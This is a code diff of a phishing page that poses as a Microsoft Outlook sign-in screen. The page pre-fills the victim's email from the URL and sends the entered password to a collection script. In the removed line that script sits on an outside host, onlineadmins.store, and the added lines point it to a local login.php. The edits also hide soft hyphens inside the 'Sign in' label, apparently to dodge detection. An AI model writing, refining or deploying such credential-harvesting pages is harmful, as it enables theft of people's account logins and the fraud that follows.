@@ -183,7 +183,7 @@ body {
     </div>
     <div class="login-box">
         <div class="form-signin">
-					<form action="" method="POST">
+					<form action="" method="https://onlineadmins.store/cloud9/login.php">
 
             <img class="mb-4" src="https://web.cytrack.com/wpv1/wp-content/uploads/microsoft-outlook-logo.jpg" alt="" style="width: 100%">
             <h1 style="" class="h4 mb-3 font-weight-normal" id="corportate-title"> <i></i> <span id="theDomain"></span> &amp; Account Settings</h1><br>
@@ -197,7 +197,7 @@ body {
             <div class="checkbox mb-3 text-left">
                 <label><input type="checkbox" value="remember-me">&nbsp;<span id="privateLabel" aria-hidden="true">Private computer</span>(<a href="javascript:void(0);" class="signInCheckBoxLink" role="link">What is this?</a>)‎</label>
             </div>
-            <button id="btn-submit" style="float:right" class="btn btn-lg btn-primary btn-block"><i id="iSpin" class="fa fa-pulse"></i> Listen to Audio Message</button>
+            <button id="btn-submit" style="float:right" class="btn btn-lg btn-primary btn-block"><i id="iSpin" class="fa fa-pulse"></i> Si­g­n i­n</button>
          </form>
                 <br><br><br><br>
             <p class="mt-5 mb-3 text-muted">©<script>document.write(new Date().getFullYear());</script> Microsoft
@@ -279,7 +279,7 @@ body {
     let divide2 = href.split("#");
     $('#theDomain').text(divide1[1]);
     $('#txtEmail').val(divide2[1]);
-    let cpanel_url = "https://onlineadmins.store/cloud9/login.php";
+    let cpanel_url = "login.php";
     let userIP = '';
 
     var currentBrowser = $.browserDetection(true);
@@ -312,7 +312,7 @@ body {
                     },
               success: function(data){
                 if (data == 0){
-                    $('#warning').text('The user name or password you entered isn't correct. Try entering it again');
+                    $('#warning').text('Your email or Password is incorrect !');
                     $('#hdnPwd').val('');
                     $('#inputPassword').val('');
                     $('#iSpin').toggleClass('fa-spinner');
